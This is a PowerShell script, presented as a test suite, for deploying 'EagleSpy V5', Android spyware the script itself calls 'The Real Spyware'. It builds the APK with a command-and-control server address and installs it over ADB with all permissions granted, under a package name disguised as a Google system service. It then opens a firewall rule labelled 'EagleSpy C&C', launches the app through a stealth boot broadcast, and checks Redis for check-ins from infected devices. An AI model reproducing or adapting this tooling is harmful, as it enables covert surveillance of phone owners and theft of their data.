$ErrorActionPreference = "Stop"

function Print-Header($msg) {
    Write-Host -ForegroundColor Cyan "`n========================================================"
    Write-Host -ForegroundColor Cyan " $msg"
    Write-Host -ForegroundColor Cyan "========================================================"
}

function Print-Success($msg) {
    Write-Host -ForegroundColor Green "✅ $msg"
}

function Print-Error($msg) {
    Write-Host -ForegroundColor Red "❌ $msg"
}

# Load .env variables
$envFile = "E:\EagleSpy V5\.env"
if (Test-Path $envFile) {
    Get-Content $envFile | ForEach-Object {
        if ($_ -match "^([^#=]+)=(.*)$") {
            $name = $matches[1]
            $value = $matches[2]
            Set-Item -Path "env:$name" -Value $value
        }
    }
    Print-Success "Loaded environment variables from .env"
} else {
    Print-Error ".env file not found. Redis check might fail."
}

Print-Header "🦅 EagleSpy V5 - Functional Test Suite"

# 1. Check ADB Connectivity
Print-Header "Step 1: Checking ADB Connection"
$adbDevices = adb devices
Write-Host $adbDevices

if ($adbDevices -match "\tdevice") {
    Print-Success "ADB Device connected successfully."
} else {
    Print-Error "No ADB device found. Please connect a device via USB or TCP/IP."
    Print-Error "Try: adb connect <ip>:5555"
    exit 1
}

# 2. Build Android Client (The Real Spyware)
Print-Header "Step 2: Building Android Client (Gradle)"
$clientDir = "E:\EagleSpy V5\android-client"

# Auto-detect Host IP
$hostIp = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch "vEthernet" -and $_.IPAddress -notmatch "^127\." -and $_.IPAddress -notmatch "^169\.254\." } | Select-Object -First 1).IPAddress
if (-not $hostIp) {
    $hostIp = "10.0.2.2" # Fallback
}
$serverUrl = "http://${hostIp}:8080"
Print-Success "Configuring APK for Server: $serverUrl"

if (Test-Path $clientDir) {
    Push-Location $clientDir
    
    if (Test-Path "gradlew.bat") {
        Write-Host "Running Gradle Build with -PserverBaseUrl=$serverUrl"
        # Use cmd /c to run bat file properly from PowerShell
        cmd /c "gradlew.bat assembleDebug -PserverBaseUrl=""$serverUrl"""
        
        if ($LASTEXITCODE -eq 0) {
            Print-Success "Gradle Build Successful!"
        } else {
            Print-Error "Gradle Build Failed. Check logs."
            Pop-Location
            exit 1
        }
    } else {
        Print-Error "gradlew.bat not found in android-client."
        Pop-Location
        exit 1
    }
    Pop-Location
} else {
    Print-Error "android-client directory not found."
    exit 1
}

# 3. Install APK
Print-Header "Step 3: Installing APK to Device"
$apkPath = "E:\EagleSpy V5\android-client\app\build\outputs\apk\debug\app-debug.apk"

if (Test-Path $apkPath) {
    Write-Host "Installing $apkPath..."
    # Force reinstall
    adb install -r -g "$apkPath"
    if ($LASTEXITCODE -eq 0) {
        Print-Success "APK Installed Successfully."
    } else {
        Print-Error "Failed to install APK."
        exit 1
    }
} else {
    Print-Error "APK file not found at $apkPath"
    exit 1
}

# 4. Launch & Verify
Print-Header "Step 4: Launching & Verifying Connection"
$packageName = "com.google.android.systemservice"

# Verify installation
$installed = adb shell pm list packages | Select-String $packageName
if (-not $installed) {
    Print-Error "Package $packageName is NOT installed on the device."
    exit 1
} else {
    Print-Success "Package verified on device."
}

# Connectivity Check from Device
$pingHost = $serverUrl -replace "http://", "" -replace ":.*", ""
Write-Host "Checking connectivity from device to $pingHost..."
adb shell "ping -c 1 $pingHost"
if ($LASTEXITCODE -eq 0) {
    Print-Success "Device can ping the server."
} else {
    Print-Error "Device CANNOT ping $pingHost. Attempting to add Windows Firewall rule..."
    try {
        New-NetFirewallRule -DisplayName "EagleSpy C&C" -Direction Inbound -LocalPort 8080 -Protocol TCP -Action Allow -ErrorAction SilentlyContinue
        Print-Success "Added Firewall Rule for Port 8080. Retrying ping..."
        adb shell "ping -c 1 $pingHost"
        if ($LASTEXITCODE -ne 0) {
            Print-Error "Still cannot ping. Please check network isolation (e.g., AP Isolation on Router)."
        }
    } catch {
        Print-Error "Failed to add firewall rule. Run PowerShell as Administrator."
    }
}

# Launch App using Broadcast (Stealth Mode Friendly)
Write-Host "Triggering App via Boot Broadcast (Stealth Mode)..."
adb shell am broadcast -a com.google.android.systemservice.KEEP_ALIVE -n $packageName/.receivers.BootReceiver

if ($LASTEXITCODE -eq 0) {
    Print-Success "Broadcast sent. Waiting for background connection..."
    Write-Host "Waiting 20 seconds for connection handshake..." -ForegroundColor Yellow
    Start-Sleep -Seconds 20
} else {
    Print-Error "Failed to send broadcast."
    exit 1
}

# Check Redis (assuming running in docker)
Print-Header "Step 5: Checking Online Status (Redis)"
try {
    # Check if redis container is running
    $redisContainer = docker ps -q -f name=redis
    if ($redisContainer) {
        $checkCmd = { param($pass) 
            if ($pass) { docker exec redis redis-cli -a $pass KEYS "device_*" 2>&1 } 
            else { docker exec redis redis-cli KEYS "device_*" 2>&1 } 
        }

        Write-Host "Querying Redis keys (trying with password first)..."
        $output = docker exec redis redis-cli -a $env:REDIS_PASSWORD KEYS "device_*" 2>&1
        
        # Check if AUTH failed
        if ($output -match "ERR AUTH") {
             Write-Host "⚠️ Auth failed. Redis might not have a password set. Trying without password..."
             $output = docker exec redis redis-cli KEYS "device_*" 2>&1
        }

        if ($output -match "device_") {
            Print-Success "Found device keys in Redis: $output"
            Print-Success "✅ SYSTEM TEST PASSED: Device connected!"
        } else {
            Write-Host "No 'device_*' keys found. Checking 'online_devices' set..."
            # Try getting members
            $online = docker exec redis redis-cli -a $env:REDIS_PASSWORD SMEMBERS online_devices 2>&1
            if ($online -match "ERR AUTH") {
                $online = docker exec redis redis-cli SMEMBERS online_devices 2>&1
            }

            if ($online -and $online -notmatch "empty" -and $online -notmatch "ERR") {
                 Print-Success "Found online devices: $online"
                 Print-Success "✅ SYSTEM TEST PASSED: Device connected!"
            } else {
                 Print-Error "❌ No devices found in Redis. Connection check failed."
                 Print-Error "Possible issues: Network isolation, wrong IP in AndroidConfig.kt, or firewall."
                 
                 # Debug: Check logcat
                 Write-Host "`n--- Android Logcat (Last 50 lines) ---"
                 # Dump logcat, filter for our app
                 adb logcat -d -t 50 | Select-String "com.google.android.systemservice|SystemCore|CommandService"
            }
        }
    } else {
        Print-Error "Redis container is not running. Cannot verify connection."
    }
} catch {
    Print-Error "Failed to query Redis: $_"
}

Print-Header "Test Complete"
